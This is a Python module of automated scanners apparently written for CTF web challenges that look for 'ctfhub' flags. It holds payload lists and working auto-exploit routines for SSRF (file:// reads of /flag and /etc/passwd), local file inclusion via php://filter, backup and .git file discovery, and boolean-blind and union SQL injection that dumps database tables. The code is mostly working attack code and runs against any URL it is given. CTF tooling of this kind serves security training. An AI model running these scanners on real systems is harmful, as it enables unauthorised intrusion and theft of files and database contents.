#!/usr/bin/env python3
"""Quick vulnerability scanners for CTF target exploration.

Each scanner takes a target URL + optional exploration data and returns
(flag: Optional[str], findings: List[dict]). Designed to be called by
the coordinator or standalone during manual analysis.
"""

import base64
import re
import requests
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

# ── Payload dictionaries ────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    "file:///flag",
    "file:///flag.txt",
    "file:///etc/passwd",
    "file:///var/www/html/flag.php",
    "http://127.0.0.1/flag.php",
    "http://127.0.0.1/",
]

LFI_PAYLOADS = [
    "/flag",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/flag",
    "php://filter/convert.base64-encode/resource=flag.php",
]

LFI_PARAMS = ["file", "page", "include", "path", "template", "view", "lang", "load"]

SQLI_PARAMS = ["id", "uid", "pid", "cat", "cid", "gid", "nid", "page", "news",
               "article", "user", "product", "item", "no", "num", "type", "cid",
               "msg_id", "post_id", "topic_id"]

BACKUP_EXTENSIONS = [".swp", ".swo", ".bak", ".old", "~", ".save", ".orig"]
BACKUP_BASES = ["index.php", "flag.php", "config.php", "admin.php", "user.php",
                "login.php", ".htaccess", "app.py", "main.py"]


# ── Scanner functions ───────────────────────────────────────────────────────

def scan_ssrf(target_url: str, forms: List[str] = None,
              endpoints: List[str] = None) -> Tuple[Optional[str], List[Dict]]:
    """Auto-exploit SSRF via file://, gopher://, dict:// protocols.

    Returns (flag, findings_list).
    """
    findings = []
    test_urls = set()

    if forms:
        for ep in forms:
            test_urls.add(ep if ep.startswith("http") else target_url.rstrip("/") + "/" + ep.lstrip("/"))
    if endpoints:
        for ep in endpoints:
            test_urls.add(ep if ep.startswith("http") else target_url.rstrip("/") + "/" + ep.lstrip("/"))
    if not test_urls:
        test_urls.add(target_url + "/modify.php")
        test_urls.add(target_url + "/user.php")

    fields = ["host", "url", "target", "website", "site", "path"]

    for test_url in test_urls:
        for payload in SSRF_PAYLOADS:
            for field in fields:
                try:
                    r = requests.post(test_url, data={field: payload}, timeout=5)
                    m = re.search(r"ctfhub\{[a-f0-9]+\}", r.text)
                    if m:
                        findings.append({"type": "SSRF_FLAG", "url": test_url,
                                        "field": field, "payload": payload})
                        return m.group(0), findings
                    if "root:" in r.text:
                        findings.append({"type": "SSRF_PASSWD", "url": test_url,
                                        "field": field, "payload": payload,
                                        "size": len(r.text)})
                except Exception:
                    pass

    return None, findings


def scan_backup(target_url: str) -> Tuple[Optional[str], List[Dict]]:
    """Scan for backup/source files and extract flags from leaked source.

    Returns (flag, findings_list).
    """
    findings = []
    base_url = target_url.rstrip("/")

    for base in BACKUP_BASES:
        for ext in BACKUP_EXTENSIONS:
            url = f"{base_url}/.{base}{ext}"
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and len(r.text) > 20:
                    findings.append({"type": "BACKUP_FOUND", "url": url,
                                    "size": len(r.text)})
                    # Check for flag in content
                    m = re.search(r"ctfhub\{[a-f0-9]+\}", r.text)
                    if m:
                        return m.group(0), findings
                    # Check for flag variable assignment
                    if "flag" in r.text.lower():
                        m2 = re.search(
                            r'(?:flag|FLAG)\s*[=:]\s*["\'](ctfhub\{[^}]+\})',
                            r.text)
                        if m2:
                            return m2.group(1), findings
            except Exception:
                pass

    # Also check common paths
    for path in ["robots.txt", "sitemap.xml", ".git/HEAD", ".svn/entries",
                 ".DS_Store", "README.md", "composer.json", "package.json"]:
        try:
            r = requests.get(f"{base_url}/{path}", timeout=5)
            if r.status_code == 200 and len(r.text) > 10:
                findings.append({"type": "HIDDEN_FILE", "url": path,
                                "size": len(r.text)})
        except Exception:
            pass

    return None, findings


def scan_lfi(target_url: str) -> Tuple[Optional[str], List[Dict]]:
    """Auto-exploit LFI for flag reading.

    Returns (flag, findings_list).
    """
    findings = []

    for param in LFI_PARAMS:
        for payload in LFI_PAYLOADS:
            try:
                r = requests.get(target_url, params={param: payload}, timeout=5)
                text = r.text
                m = re.search(r"ctfhub\{[a-f0-9]+\}", text)
                if m:
                    findings.append({"type": "LFI_FLAG", "param": param,
                                    "payload": payload})
                    return m.group(0), findings
                if "root:" in text:
                    findings.append({"type": "LFI_PASSWD", "param": param,
                                    "payload": payload, "size": len(text)})
                # Check base64-encoded output (php://filter)
                b64_match = re.search(r"([A-Za-z0-9+/=]{30,})", text)
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(1)).decode(
                            "utf-8", errors="ignore")
                        fm = re.search(r"ctfhub\{[a-f0-9]+\}", decoded)
                        if fm:
                            findings.append({"type": "LFI_B64_FLAG", "param": param})
                            return fm.group(0), findings
                    except Exception:
                        pass
            except Exception:
                pass

    return None, findings


def scan_sqli(target_url: str, forms: List[str] = None,
              endpoints: List[str] = None) -> Tuple[Optional[str], List[Dict]]:
    """Auto-detect and exploit boolean-based blind SQLi.

    Probes common params for boolean injection, then uses BlindSqliExtractor
    to dump the database and extract the flag.
    """
    findings = []
    base = target_url.rstrip("/")

    # Collect candidate URLs from forms and endpoints
    candidate_urls = []
    if forms:
        for ep in forms:
            candidate_urls.append(ep if ep.startswith("http") else base + "/" + ep.lstrip("/"))
    if endpoints:
        for ep in endpoints:
            candidate_urls.append(ep if ep.startswith("http") else base + "/" + ep.lstrip("/"))
    if not candidate_urls:
        candidate_urls.append(target_url)

    # Use known patterns from solved challenges
    known_patterns = {
        "modify.php": "url",       # SSRF param, not SQLi
    }

    for url in set(candidate_urls):
        if flag := _try_sqli_on_url(url, findings):
            return flag, findings

    return None, findings


def _try_sqli_on_url(url: str, findings: List[Dict]) -> Optional[str]:
    """Try boolean SQLi detection on a single URL with all candidate params."""
    for param in SQLI_PARAMS:
        # Test if param exists by checking response difference
        try:
            r1 = requests.get(url, params={param: "1"}, timeout=5)
            r2 = requests.get(url, params={param: "2"}, timeout=5)
            if r1.status_code == r2.status_code and len(r1.content) == len(r2.content):
                continue  # No difference — not injectable
        except Exception:
            continue

        # Detect boolean injection
        true_payload = "1' and '1'='1"
        false_payload = "1' and '1'='2"
        try:
            r_true = requests.get(url, params={param: true_payload}, timeout=5)
            r_false = requests.get(url, params={param: false_payload}, timeout=5)
        except Exception:
            continue

        if abs(len(r_true.content) - len(r_false.content)) < 10:
            true_payload = "1 and 1=1"
            false_payload = "1 and 1=2"
            try:
                r_true = requests.get(url, params={param: true_payload}, timeout=5)
                r_false = requests.get(url, params={param: false_payload}, timeout=5)
            except Exception:
                continue

        size_diff = abs(len(r_true.content) - len(r_false.content))
        if size_diff < 20:
            continue

        findings.append({
            "type": "SQLI_DETECTED", "param": param, "url": url,
            "true_size": len(r_true.content), "false_size": len(r_false.content),
            "size_diff": size_diff,
        })

        # Quick flag check via common payloads
        for direct_payload in [
            "' union select flag,2,3 from flag#",
            "' union select flag,2,3 from flag-- -",
            "' union select load_file('/flag'),2,3#",
            "' union select load_file('/flag.txt'),2,3#",
        ]:
            try:
                r = requests.get(url, params={param: direct_payload}, timeout=5)
                m = re.search(r"ctfhub\{[a-f0-9]+\}", r.text)
                if m:
                    flag = m.group(0)
                    findings.append({"type": "SQLI_FLAG", "method": "union_direct"})
                    return flag
            except Exception:
                pass

        # Use BlindSqliExtractor for methodical extraction
        try:
            from tools.feeder.blind_sqli_extractor import BlindSqliExtractor

            b = BlindSqliExtractor(
                target=url, param=param, true_size=len(r_true.content),
                waf_keywords=["limit", "table", "handler", "union", "load_file"],
                timeout=8,
            )

            # Quick check: extract database name (short)
            db_name = b.extract_string("select database()", 32)
            if db_name:
                findings.append({"type": "SQLI_DB", "db_name": db_name, "param": param})

            tables = b.extract_tables()
            findings.append({"type": "SQLI_TABLES", "tables": tables})
            if not tables:
                continue

            # Look for flag-related tables first
            flag_tables = [t for t in tables if "flag" in t.lower()]
            search_tables = flag_tables + [t for t in tables if t not in flag_tables]

            for tname in search_tables[:5]:
                cols = b.extract_columns(tname)
                if not cols:
                    continue
                # Prioritize flag-like columns
                flag_cols = [c for c in cols if "flag" in c.lower()]
                target_cols = flag_cols + [c for c in cols if c not in flag_cols]

                data = b.extract_data(tname, target_cols[:6], max_len=500)
                if data:
                    m = re.search(r"ctfhub\{[a-f0-9]+\}", data)
                    if m:
                        flag = m.group(0)
                        findings.append({"type": "SQLI_FLAG", "table": tname,
                                        "method": "blind_extraction"})
                        return flag
                    findings.append({"type": "SQLI_DATA", "table": tname,
                                    "columns": target_cols[:6], "data_preview": data[:200]})
        except ImportError:
            pass
        except Exception:
            pass

    return None


def quick_recon(target_url: str) -> Dict[str, Any]:
    """Basic recon: grab page title, discover forms/endpoints."""
    data: Dict[str, Any] = {
        "endpoints": [], "forms": [], "title": None,
        "page_size": 0, "error": None,
    }

    try:
        r = requests.get(target_url, timeout=10, allow_redirects=True)
        data["page_size"] = len(r.text)

        title_m = re.search(r"<title>(.*?)</title>", r.text, re.I)
        if title_m:
            data["title"] = title_m.group(1)

        # Discover PHP endpoints
        hrefs = re.findall(r'href="([^"]*\.php[^"]*)"', r.text, re.I)
        actions = re.findall(r'action="([^"]*\.php[^"]*)"', r.text, re.I)
        srcs = re.findall(r'src="([^"]*\.php[^"]*)"', r.text, re.I)
        data["endpoints"] = list(set(hrefs + actions + srcs))

        # Discover forms
        form_actions = re.findall(r'<form[^>]*action="([^"]*)"', r.text, re.I)
        data["forms"] = list(set(form_actions))
    except Exception as e:
        data["error"] = str(e)

    return data


def scan_vulnerability(target_url: str, pattern_id: str) -> Tuple[Optional[str], List[Dict]]:
    """Dispatch to the right scanner based on pattern ID.

    Args:
        target_url: Target challenge URL.
        pattern_id: Pattern ID from ctf_patterns (e.g., 'ssrf_curl_file', 'lfi_include').

    Returns:
        (flag or None, findings list).
    """
    recon = quick_recon(target_url)

    if pattern_id.startswith("ssrf"):
        return scan_ssrf(target_url, forms=recon.get("forms", []),
                        endpoints=recon.get("endpoints", []))
    elif pattern_id.startswith("lfi") or pattern_id.startswith("file_inclusion"):
        return scan_lfi(target_url)
    elif pattern_id.startswith("backup"):
        return scan_backup(target_url)
    elif pattern_id.startswith("sqli") or "sql" in pattern_id.lower():
        return scan_sqli(target_url, forms=recon.get("forms", []),
                        endpoints=recon.get("endpoints", []))
    else:
        return None, [{"type": "RECON", "data": recon}]
